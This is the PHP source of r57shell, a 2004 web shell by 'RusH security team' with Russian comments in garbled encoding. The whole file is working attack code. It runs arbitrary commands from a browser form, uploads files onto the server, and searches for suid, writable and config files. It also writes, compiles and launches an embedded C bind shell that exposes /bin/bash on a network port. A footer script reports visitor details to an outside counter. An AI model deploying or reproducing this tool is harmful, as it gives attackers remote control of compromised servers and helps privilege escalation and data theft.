<?
/******************************************************************************************************/
/*
/*                                 __________               ___ ___
/*                                 \______   \__ __  ______/   |   \
/*                                  |       _/  |  \/  ___/    _    \
/*                                  |    |   \  |  /\___ \\         /
/*                                  |____|_  /____//____  >\___|_  /
/*                                  -======\/==security=\/=team==\/
/*
/*                                   SPECIAL xbIx birthday edition
/*
/*  r57shell.php - ñêðèïò íà ïõï ïîçâîëÿþùèé âàì âûïîëíÿòü øåëë êîìàíäû  íà ñåðâåðå ÷åðåç áðàóçåð
/*  Âû ìîæåòå ñêà÷àòü íîâóþ âåðñèþ íà íàøåì ñàéòå: http://rst.void.ru èëè www.rsteam.ru
/*  Âåðñèÿ 1.0 beta (ïèñàëàñü ïðàêòè÷åñêè íà êîëåíêå... òàê ÷òî êîä ñûðîâàò... äëÿ òåñòèðîâàíèÿ)
/*
/*  Âîçìîæíîñòè:
/*  ~ çàùèòà ñêðèïòà ñ ïîìîùüþ ïàðîëÿ
/*  ~ âûïîëíåíèå øåëë-êîìàíä
/*  ~ çàãðóçêà ôàéëîâ íà ñåðâåð
/*  ~ ïîääåðæèâàåò àëèàñû êîìàíä
/*  ~ âêëþ÷åíû 4 àëèàñà êîìàíä:
/*    - ïîèñê íà ñåðâåðå âñåõ ôàéëîâ ñ suid áèòîì
/*    - ïîèñê íà ñåðâåðå âñåõ ôàéëîâ ñ sgid áèòîì
/*    - ïîèñê íà ñåðâåðå ôàéëîâ config.inc.php
/*    - ïîèñê íà ñåðâåðå âñåõ äèðåêòîðèé è ôàéëîâ äîñòóïíûõ íà çàïèñü äëÿ âñåõ
/*  ~ äâà ÿçûêà èíòåðôåéñà: ðóññêèé, àíãëèéñêèé
/*  ~ âîçìîæíîñòü çàáèíäèòü /bin/bash íà îïðåäåëåííûé ïîðò
/*
/*  05.03.2004 (c) RusH security team
/*
/******************************************************************************************************/

## Àóòåíòèôèêàöèÿ

## Ëîãèí è ïàðîëü äëÿ äîñòóïà ê ñêðèïòó
## ÍÅ ÇÀÁÓÄÜÒÅ ÑÌÅÍÈÒÜ ÏÅÐÅÄ ÐÀÇÌÅÙÅÍÈÅÌ ÍÀ ÑÅÐÂÅÐÅ!!!
$name="r57"; ## ëîãèí ïîëüçîâàòåëÿ
$pass="r57"; ## ïàðîëü ïîëüçîâàòåëÿ

if(!isset($PHP_AUTH_USER))
  {
  Header('WWW-Authenticate: Basic realm="r57shell"');
  Header('HTTP/1.0 401 Unauthorized');
  exit;
  }
else
  {
  if(($PHP_AUTH_USER != $name ) || ($PHP_AUTH_PW != $pass))
    {
    Header('WWW-Authenticate: Basic realm="r57shell"');
    Header('HTTP/1.0 401 Unauthorized');
    exit;
    }
  }

error_reporting(0);
set_time_limit(0);


/*
Âûáîð ÿçûêà
$language='ru' - ðóññêèé
$language='eng' - àíãëèéñêèé
*/

$language='ru';

$lang=array(
           'ru_text1' => 'Âûïîëíåííàÿ êîìàíäà',
           'ru_text2' => 'Âûïîëíåíèå êîìàíä íà ñåðâåðå',
           'ru_text3' => 'Âûïîëíèòü êîìàíäó',
           'ru_text4' => 'Ðàáî÷àÿ äèðåêòîðèÿ',
           'ru_text5' => 'Çàãðóçêà ôàéëîâ íà ñåðâåð',
           'ru_text6' => 'Ëîêàëüíûé ôàéë',
           'ru_text7' => 'Àëèàñû',
           'ru_text8' => 'Âûáåðèòå àëèàñ',
           'ru_butt1' => 'Âûïîëíèòü',
           'ru_butt2' => 'Çàãðóçèòü',
           'ru_text9' => 'Îòêðûòèå ïîðòà è ïðèâÿçêà åãî ê /bin/bash',
           'ru_text10' => 'Îòêðûòü ïîðò',
           'ru_text11' => 'Ïàðîëü äëÿ äîñòóïà',
           'ru_butt3' => 'Îòêðûòü',
           
           'eng_text1' => 'Executed command',
           'eng_text2' => 'Execute command on server',
           'eng_text3' => '&nbsp;Run command',
           'eng_text4' => 'Work directory',
           'eng_text5' => 'Upload files on server',
           'eng_text6' => 'Local file',
           'eng_text7' => 'Aliases',
           'eng_text8' => 'Select alias',
           'eng_butt1' => 'Execute',
           'eng_butt2' => 'Upload',
           'eng_text9' => 'Bind port to /bin/bash',
           'eng_text10' => 'Port',
           'eng_text11' => 'Password for access',
           'eng_butt3' => 'Bind'
           );



/*
Àëèàñû êîìàíä
Ïîçâîëÿþò èçáåæàòü ìíîãîêðàòíîãî íàáîðà îäíèõ è òåõ-æå êîìàíä. ( Ñäåëàíî áëàãîäàðÿ ìîåé ïðèðîäíîé ëåíè )
Âû ìîæåòå ñàìè äîáàâëÿòü èëè èçìåíÿòü êîìàíäû.
*/

$aliases=array(
/* ïîèñê íà ñåðâåðå âñåõ ôàéëîâ ñ suid áèòîì */
'find all suid files' => 'find / -type f -perm -04000 -ls',

/* ïîèñê íà ñåðâåðå âñåõ ôàéëîâ ñ sgid áèòîì */
'find all sgid files' => 'find / -type f -perm -02000 -ls',

/* ïîèñê íà ñåðâåðå ôàéëîâ config.inc.php */
'find config.inc.php files' => 'find / -type f -name config.inc.php',

/* ïîèñê íà ñåðâåðå âñåõ äèðåêòîðèé è ôàéëîâ äîñòóïíûõ íà çàïèñü äëÿ âñåõ */
'find writable directories and files' => 'find / -perm -2 -ls',
'----------------------------------------------------------------------------------------------------' => 'ls -la'
);

/* Port bind source */
$port_bind_bd_c="
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
int main(argc,argv)
int argc;
char **argv;
{
int sockfd, newfd;
char buf[30];
struct sockaddr_in remote;
if(argc < 3) usage(argv[0]);
if(fork() == 0) { // Îòâåòâëÿåì íîâûé ïðîöåññ
remote.sin_family = AF_INET;
remote.sin_port = htons(atoi(argv[1]));
remote.sin_addr.s_addr = htonl(INADDR_ANY);
sockfd = socket(AF_INET,SOCK_STREAM,0);
if(!sockfd) perror(\"socket error\");
bind(sockfd, (struct sockaddr *)&remote, 0x10);
listen(sockfd, 5);
while(1)
{
newfd=accept(sockfd,0,0);
dup2(newfd,0);
dup2(newfd,1);
dup2(newfd,2);
write(newfd,\"Password:\",10);
read(newfd,buf,sizeof(buf));
if (!chpass(argv[2],buf))
system(\"echo welcome to r57 shell && /bin/bash -i\");
else
fprintf(stderr,\"Sorry\");
close(newfd);
}
}
}
int usage(char *progname)
{
fprintf(stderr,\"USAGE:%s <port num> <password>\n\",progname);
exit(0);
}
int chpass(char *base, char *entered) {
int i;
for(i=0;i<strlen(entered);i++)
{
if(entered[i] == '\n')
entered[i] = '\0';
}
if (!strcmp(base,entered))
return 0;
}";

?>
<!-- Çäðàâñòâóé  Âàñÿ -->
<html>
<head>
<title>r57shell</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<STYLE>
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
table {
BORDER-RIGHT:  #eeeeee 2px outset;
BORDER-TOP:    #eeeeee 2px outset;
BORDER-LEFT:   #eeeeee 2px outset;
BORDER-BOTTOM: #eeeeee 2px outset;
BACKGROUND-COLOR: #D4D0C8;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #e4e0d8;
width: 30%;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;

}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>

</head>
<body bgcolor="#e4e0d8">
<table width=100%cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc>
<!-- logo -->
<font face=Verdana size=2>&nbsp;&nbsp;
<font face=Webdings size=6><b>!</b></font><b>&nbsp;&nbsp;r57shell</b>
</font>
</td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=100>
<?
/* change dir */
if (($_POST['dir']!=="") AND ($_POST['dir'])) { chdir($_POST['dir']); }
/* display information */
echo "<font face=Verdana size=-2>";
echo "<font color=blue><b>uname -a :&nbsp;<br>id :&nbsp;<br>pwd :&nbsp;</b></font><br>";
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
echo "&nbsp;&nbsp;&nbsp; ".exec("uname -a")."<br>";
echo "&nbsp;&nbsp;&nbsp; ".exec("id")."<br>";
echo "&nbsp;&nbsp;&nbsp; ".exec("pwd")."";
echo "</b></font>";
echo "</font>";
?>
</td></tr></table>
<?
/* port bind */
if (($_POST['bind']) AND ($_POST['bind']=="bd.c") AND ($_POST['port']) AND ($_POST['bind_pass']))
{
 $w_file=fopen("/tmp/bd.c","ab+") or exit();
 fputs($w_file,$port_bind_bd_c);
 fclose($w_file);
 $_POST['cmd']="cd /tmp/; gcc -o bd bd.c; ./bd ".$_POST['port']." ".$_POST['bind_pass']."; ps -aux | grep bd";
}
?>
<?
/* alias execute */
if (($_POST['alias']) AND ($_POST['alias']!==""))
 {
 foreach ($aliases as $alias_name=>$alias_cmd) {
                                               if ($_POST['alias'] == $alias_name) {$_POST['cmd']=$alias_cmd;}
                                               }
 }
?>
<?
/* file upload */
if (($HTTP_POST_FILES["userfile"]!=="") AND ($HTTP_POST_FILES["userfile"]))
{
copy($HTTP_POST_FILES["userfile"][tmp_name],
            $_POST['dir']."/".$HTTP_POST_FILES["userfile"][name])
      or print("<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><td><tr><font color=red face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES["userfile"][name]."</div></font></td></tr></table>");
}
?>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc>
<?
/* command execute */
if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="ls -la"; }
echo "<font face=Verdana size=-2>".$lang[$language._text1].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td>";
echo "<b>";
echo "<div align=center><textarea name=report cols=122 rows=15>";
echo "".passthru($_POST['cmd'])."";
echo "</textarea></div>";
echo "</b>";
?>
</td></tr></table>
<table width=100% heigth=0 cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: <? echo $lang[$language._text2]; ?> ::</div></b></font></td></tr>
<tr><td height=23>
<?
/* command execute form */
echo "<form name=command method=post>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;".$lang[$language._text3]." <font face=Wingdings color=gray>è</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=cmd size=85>&nbsp;&nbsp;<br>";
echo "<b>&nbsp;".$lang[$language._text4]." <font face=Wingdings color=gray>è</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=text name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=text name=dir size=85 value=".$_POST['dir'].">"; }
echo "&nbsp;&nbsp;<input type=submit name=submit value=\" ".$lang[$language._butt1]." \">";
echo "</font>";
echo "</form>";
?>
</td></tr></table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: <? echo $lang[$language._text5]; ?> ::</div></b></font></td></tr>
<tr><td>
<?
/* file upload form */
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text6]." <font face=Wingdings color=gray>è</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=file name=userfile size=85>&nbsp;";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=hidden name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=hidden name=dir size=85 value=".$_POST['dir'].">"; }
echo "<input type=submit name=submit value=\" ".$lang[$language._butt2]." \">";
echo "</font>";
echo "</form>";
?>
</td></tr></table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: <? echo $lang[$language._text7]; ?> ::</div></b></font></td></tr>
<tr><td>
<?
/* aliases form */
echo "<form name=aliases method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text8]." <font face=Wingdings color=gray>è</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<select name=alias>";
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 echo "<option>$alias_name</option>";
 }
 echo "</select>";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=hidden name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=hidden name=dir size=85 value=".$_POST['dir'].">"; }
echo "&nbsp;&nbsp;<input type=submit name=submit value=\" ".$lang[$language._butt1]." \">";
echo "</font>";
echo "</form>";
?>
</td></tr></table>


<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: <? echo $lang[$language._text9]; ?> ::</div></b></font></td></tr>
<tr><td>
<?
/* port bind form */
echo "<form name=bind method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text10]." <font face=Wingdings color=gray>è</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=port size=15 value=11457>&nbsp;";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text11]." <font face=Wingdings color=gray>è</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=bind_pass size=15 value=r57>&nbsp;";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=hidden name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=hidden name=dir size=85 value=".$_POST['dir'].">"; }
echo "<input type=hidden name=bind size=1 value=bd.c>";
echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value=\" ".$lang[$language._butt3]." \">";
echo "</font>";
echo "</form>";
?>
</td></tr></table>




<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc>
<?
echo "<div align=center><font face=Verdana size=-2><b>o---[ r57shell - http-shell by RusH security team | <a href=http://rst.void.ru>http://rst.void.ru</a> | version 1.0 beta ]---o</b></font></div>";
?>
</td></tr></table>

<!-- don't delete this plz -->
<script language="javascript">
hotlog_js="1.0";
hotlog_r=""+Math.random()+"&s=81606&im=1&r="+escape(document.referrer)+"&pg="+
escape(window.location.href);
document.cookie="hotlog=1; path=/"; hotlog_r+="&c="+(document.cookie?"Y":"N");
</script><script language="javascript1.1">
hotlog_js="1.1";hotlog_r+="&j="+(navigator.javaEnabled()?"Y":"N")</script>
<script language="javascript1.2">
hotlog_js="1.2";
hotlog_r+="&wh="+screen.width+'x'+screen.height+"&px="+
(((navigator.appName.substring(0,3)=="Mic"))?
screen.colorDepth:screen.pixelDepth)</script>
<script language="javascript1.3">hotlog_js="1.3"</script>
<script language="javascript">hotlog_r+="&js="+hotlog_js;
document.write("<a href='http://click.hotlog.ru/?81606' target='_top'><img "+
" src='http://hit4.hotlog.ru/cgi-bin/hotlog/count?"+
hotlog_r+"&' border=0 width=1 height=1 alt=1></a>")</script>
<noscript><a href=http://click.hotlog.ru/?81606 target=_top><img
src="http://hit4.hotlog.ru/cgi-bin/hotlog/count?s=81606&im=1" border=0
width="1" height="1" alt="HotLog"></a></noscript>
<!-- /don't delete this plz -->



<? /* -------------------------[ EOF ]------------------------- */ ?>
